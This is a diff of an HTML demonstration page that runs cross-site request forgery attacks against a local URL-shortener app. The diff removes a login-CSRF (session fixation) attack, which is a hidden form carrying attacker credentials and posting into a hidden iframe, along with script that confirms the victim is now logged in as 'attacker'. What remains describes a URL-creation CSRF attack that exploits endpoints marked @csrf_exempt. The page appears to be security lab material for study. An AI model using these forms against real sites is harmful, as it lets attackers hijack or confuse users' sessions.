@@ -68,21 +68,6 @@
         <div id="urlStatus" class="status" style="display: none;"></div>
         <p><em>This will create a malicious URL in the currently logged-in user's account</em></p>
     </div>
-    
-    <div class="form-container">
-        <h3>Attack #2: Login CSRF (Session Fixation)</h3>
-        <p>Logs victim into attacker's account:</p>
-        
-        <form id="loginCsrfForm" action="http://localhost:8000/login/" method="post" target="hiddenFrame1">
-            <input type="hidden" name="username" value="attacker">
-            <input type="hidden" name="password" value="password123">
-        </form>
-        
-        <iframe name="hiddenFrame1" style="display:none;" onload="handleLoginIframeLoad()"></iframe>
-        <button onclick="submitLoginAttack()">Execute Login Attack</button>
-        <div id="loginStatus" class="status" style="display: none;"></div>
-        <p><em>This will log you into the main app as "attacker" without leaving this page</em></p>
-    </div>
 
     <div class="instructions">
         <h3>How to Test:</h3>
@@ -93,21 +78,15 @@
             <li>Keep both tabs open</li>
         </ol>
         
-        <h4>Attack #1 - URL Creation:</h4>
+        <h4>Attack - URL Creation:</h4>
         <ol>
             <li>Click "Execute URL Attack" above</li>
             <li>Check <a href="http://localhost:8000/my-urls/" target="_blank">"My URLs"</a> in the shortener tab to see the malicious URL</li>
         </ol>
         
-        <h4>Attack #2 - Login/Session Fixation:</h4>
-        <ol>
-            <li>Click "Execute Login Attack"</li>
-            <li>Refresh the shortener tab to confirm you're logged in as "attacker"</li>
-        </ol>
-        
         <h3>Why This Works:</h3>
         <ul>
-            <li>Endpoints lack CSRF protection (<code>@csrf_exempt</code>)</li>
+            <li>The URL shortening endpoint lacks CSRF protection (<code>@csrf_exempt</code>)</li>
             <li>Browser automatically sends authentication cookies with cross-origin requests</li>
             <li>Server trusts any request with valid cookies</li>
         </ul>
@@ -147,72 +126,6 @@
                 attackSubmitted = false;
             }
         }
-        
-        let loginAttackSubmitted = false;
-        
-        function submitLoginAttack() {
-            console.log('Executing login CSRF attack...');
-            loginAttackSubmitted = true;
-            
-            const status = document.getElementById('loginStatus');
-            status.style.display = 'block';
-            status.className = 'status warning';
-            status.innerHTML = 'Submitting login attack... Please wait...';
-            
-            // Submit the form to hidden iframe
-            document.getElementById('loginCsrfForm').submit();
-            
-            // Show success message after a delay and check login status
-            setTimeout(() => {
-                if (loginAttackSubmitted) { // Still submitted, iframe didn't load
-                    status.className = 'status success';
-                    status.innerHTML = 'Login attack submitted! Checking if you\'re now logged in as "attacker"...';
-                    loginAttackSubmitted = false;
-                    // Check login status after a short delay
-                    setTimeout(checkLoginStatus, 1000);
-                }
-            }, 2000);
-        }
-        
-        function handleLoginIframeLoad() {
-            if (loginAttackSubmitted) {
-                console.log('Login form submission completed');
-                const status = document.getElementById('loginStatus');
-                status.className = 'status success';
-                status.innerHTML = 'Login attack completed! Checking if you\'re now logged in as "attacker"...';
-                loginAttackSubmitted = false;
-                // Check login status after iframe loads
-                setTimeout(checkLoginStatus, 1000);
-            }
-        }
-        
-        function checkLoginStatus() {
-            fetch('http://localhost:8000/', {
-                method: 'GET',
-                credentials: 'include'
-            })
-            .then(response => response.text())
-            .then(html => {
-                const status = document.getElementById('loginStatus');
-                if (html.includes('Welcome, attacker') || html.includes('attacker')) {
-                    status.className = 'status success';
-                    status.innerHTML = 'SUCCESS: Logged in as "attacker"!';
-                } else {
-                    status.className = 'status error';
-                    status.innerHTML = 'Not logged in as attacker';
-                }
-                status.style.display = 'block';
-            })
-            .catch(error => {
-                console.log('Status check failed:', error);
-            });
-        }
-        
-        // Auto-check login status
-        window.onload = function() {
-            setTimeout(checkLoginStatus, 1000);
-            setInterval(checkLoginStatus, 5000);
-        };
     </script>
 </body>
 </html>
